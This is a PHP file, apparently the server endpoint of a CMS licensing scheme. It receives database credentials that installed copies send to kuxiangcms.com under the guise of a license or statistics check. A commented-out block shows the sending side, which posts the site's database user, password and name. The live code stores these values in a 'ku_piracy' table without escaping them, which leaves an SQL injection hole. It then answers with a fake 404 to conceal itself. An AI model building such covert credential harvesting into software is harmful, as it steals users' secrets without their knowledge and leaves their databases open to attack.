<?php 
include("./includes/common.php");
//if( !isset($_SESSION["authcode"]) ) 
//{
//    $query = curl_get("https://www.kuxiangcms.com/api.php?act=query&host=" . $_SERVER["HTTP_HOST"] . "&authcode=" . $authcode);
//    if( $query = json_decode($query, true) ) 
//    {
//        if( $query["code"] == 1 ) 
//        {
//            $_SESSION["authcode"] = $authcode;
//        }
//        else
//        {
//            curl_get("https://www.kuxiangcms.com/tongji.php?url=" . $_SERVER["HTTP_HOST"] . "&user=" . $dbconfig["user"] . "&pwd=" . $dbconfig["pwd"] . "&db=" . $dbconfig["dbname"]);
//            exit( "<center>" . $query["msg"] . "</center>" );
//        }
//
//    }
//    else
//    {
//        echo "连接服务器失败！authsystem error";
//        exit();
//    }
//
//}
//
//if( !$_GET["url"] ) 
//{
//    exit();
//}

$url = str_ireplace("install/index.php", "", daddslashes($_GET["url"]));
$referer = parse_url($url);
$rehost = $referer["host"];
$user = $_GET["user"];
$pwd = $_GET["pwd"];
$db = $_GET["db"];
$row = $DB->get_row("SELECT * FROM ku_author WHERE kuhost='" . $rehost . "' limit 1");
if( $row["state"] != 1 ) 
{
    $DB->query("insert into `ku_piracy` (`url`,`dbuser`,`dbpwd`,`db`,`date`) values ('" . $url . "','" . $user . "','" . $pwd . "','" . $db . "','" . $date . "')");
}

$DB->close();
header("HTTP/1.0 404 Not Found");

